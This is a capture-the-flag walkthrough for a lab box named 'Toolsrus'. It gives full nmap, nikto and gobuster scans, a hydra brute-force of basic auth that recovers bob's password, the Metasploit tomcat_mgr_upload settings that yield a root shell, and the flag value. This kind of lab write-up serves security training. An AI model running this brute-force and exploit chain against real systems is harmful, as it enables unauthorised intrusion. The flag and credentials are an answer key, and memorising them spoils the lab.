> Toolsrus

# Nmap/Rutscan

nmap -sC -sV -T4 -Pn -A -vvv $IP -oN nmap/initial

```
22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1234/tcp open  http    syn-ack Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
8009/tcp open  ajp13   syn-ack Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
```

# Nikto - Port 80

nikto -h http://$IP

```
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: a8, size: 583d315d43a92, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8041 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2021-04-30 03:10:33 (GMT-4) (1642 seconds)
```

# Nikto - Port 1234

nikto -h http://$IP:1234

```
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-39272: /favicon.ico file identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ /manager/html: Default Tomcat Manager / Host Manager interface found
+ /host-manager/html: Default Tomcat Manager / Host Manager interface found
+ /manager/status: Default Tomcat Server Status interface found
+ 8195 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2021-04-30 03:30:57 (GMT-4) (1843 seconds)
```

# Gobuster - Port 80

gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x txt,php,js,sql,bak,bin,cgi,tar,zip -o gobuster/initial

```
/guidelines           (Status: 301) [Size: 317] [--> http://10.10.119.90/guidelines/]
/protected            (Status: 401) [Size: 459] => This page has authentication
```

# Gobuster - Port 1234

gobuster dir -u http://$IP:1234 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x txt,php,js,sql,bak,bin,cgi,tar,zip -o gobuster/port_1234

```
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
```

Accessing `http://$IP/guidelines` we got a message `Hey bob, did you update that TomCat server?`. Since we got an username `bob` and a HTTP basic auth directory `/protected` we can try to crack passwords using hydra.

# Hydra

hydra -l bob -P /usr/share/wordlists/rockyou.txt -f $IP http-get /protected

```
[80][http-get] host: 10.10.119.90   login: bob   password: bubbles
```

And we can access `/protected` now but it says `This protected page has now moved to a different port.`

Let's try using the same credentials on port 1234 and let's scan /managaer/html using nikto.

# Nikto

nikto -h http://$IP:1234/manager/html bob:bubbles | tee nikto_manager.log


```
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-3092: /manager/html/localstart.asp: This may be interesting...
+ OSVDB-3233: /manager/html/manager/manager-howto.html: Tomcat documentation found.
+ OSVDB-3233: /manager/html/jk-manager/manager-howto.html: Tomcat documentation found.
+ OSVDB-3233: /manager/html/jk-status/manager-howto.html: Tomcat documentation found.
+ OSVDB-3233: /manager/html/admin/manager-howto.html: Tomcat documentation found.
+ OSVDB-3233: /manager/html/host-manager/manager-howto.html: Tomcat documentation found.
```

# Metasploit

Exploit name : exploit(multi/http/tomcat_mgr_upload)

1. set RHOSTS 10.10.119.90
2. set RPORT 1234
3. set HttpUsername bob
4. set HttpPassword bubbles

We have as shell as root!!

# Flag.txt

```
ff1fc4a81affcc7688cf89ae7dc6e0e1
```